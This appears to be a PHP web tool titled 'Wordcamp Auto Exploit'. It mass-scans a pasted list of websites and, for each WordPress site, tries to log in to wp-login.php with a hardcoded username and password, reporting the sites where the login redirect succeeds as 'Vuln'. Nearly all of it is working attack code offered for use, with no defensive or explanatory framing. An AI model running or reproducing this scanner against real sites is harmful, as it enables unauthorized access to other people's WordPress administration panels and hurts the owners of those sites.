<!DOCTYPE html>
<html>
<head>
	<title>Wordcamp Auto Exploit</title>
	<meta charset="utf-8">
	<meta name="author" content="./EcchiExploit">
	<meta name="description" content="wordcamp auto scan exploit">
</head>
<body>
	<h1>Wordcamp Exploit</h1>
	<form method="POST">
		Site : <br>
		<textarea name="url" cols="60" rows="10" required></textarea>
		<button type="submit">Scan!!</button>
	</form>
</body>
</html>
<?php
function exploit($site){
	$ch  = curl_init();
	curl_setopt($ch, CURLOPT_URL, $site."/wp-login.php");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47");
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "log=wordcamp&pwd=z43218765z&wp-submit=LogIn&redirect_to=$site/wp-admin/");
	curl_setopt($ch, CURLOPT_POST, 1);
	$exe = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $info;
}
function login($site){
	$ch  = curl_init();
	curl_setopt($ch, CURLOPT_URL, $site."/wp-login.php");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	$exe = curl_exec($ch);
	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $info;
}
if (isset($_POST['url']) && !empty($_POST['url'])) {
	$url = htmlspecialchars($_POST['url']);
	$exp = explode("\n", $url);
	foreach ($exp as $key) {
		if(!preg_match('#^http(s)?://#',$key)){
			$web = "http://".$key;
		}
		else {
			$web = $key;
		}
		$site = $web;
		if (login($web) == 200) {
			if (exploit($web) == 302) {
				echo "Vuln : <font color='green'><a href='$site/wp-login.php'>$site/wp-login.php</font><br>";
			}
			else {
				echo "Not Vuln : <font color='red'>$site</font><br>";
			}
		}
		else {
			echo "Not Wordpress : <font color='blue'>$site</font><br>";
		}
	}
}
?>